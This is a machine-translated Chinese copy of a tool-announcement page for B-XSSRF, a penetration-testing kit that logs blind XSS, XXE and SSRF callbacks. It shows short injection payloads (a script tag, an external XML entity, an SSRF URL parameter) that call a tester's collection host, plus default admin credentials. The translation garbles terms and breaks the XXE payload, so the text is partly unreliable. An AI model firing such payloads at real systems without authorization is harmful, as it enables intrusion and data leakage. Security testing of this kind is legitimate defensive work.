# B-XSSRF:检测和跟踪 XSS、XXE 和 SSRF 盲人的工具包

> 原文：<https://kalilinuxtutorials.com/b-xssrf-blind-xss-xxe-ssrf/>

[![B-XSSRF : Toolkit To Detect & Keep Track On Blind XSS, XXE & SSRF](img/7eff3cc6d7ab93be853c434b52d9c36f.png "B-XSSRF : Toolkit To Detect & Keep Track On Blind XSS, XXE & SSRF")](https://1.bp.blogspot.com/-Vru9QykHSQw/XWzC4uJK6HI/AAAAAAAACUk/qmF5sv2OSXwz4N-RjcQ5iDuE9LxQuxS_gCLcBGAs/s1600/icon%2B%25281%2529.png)

B-XSSRF 是一个工具包，用于检测和跟踪盲人 XSS，XXE & SSRF。

![](img/19504b5e2c07841f769eb05564092ee3.png)

**阅读更多-[red hunt OS:对手模拟虚拟机&威胁追踪](https://kalilinuxtutorials.com/redhunt-os-virtual-machine/)**

**设置**

*   将文件上传到您的服务器。
*   创建一个数据库并将 **database.sql** 文件上传到其中。
*   更改【db.php】文件**中的 **DB 凭证**。**
*   准备好了。

**用法**

**盲人 XSS**

<embed src="”http://mysite.com/bxssrf/request.php”">
<script src = " http://my site . com/bxssrf/request . PHP ">

**盲目二十**

<DOCTYPE 根[
]T6！ENTITY % ext SYSTEM " http://my site . com/bxssrf/request . PHP ">% ext；
>
r>

**SSRF**

GET/tests SRF . PHP = http://my site . com/bxs SRF/request . PHP

**默认凭证**

**用户:**admin@test.com
通行证: 123456

[**Download**](https://github.com/SpiderMate/B-XSSRF)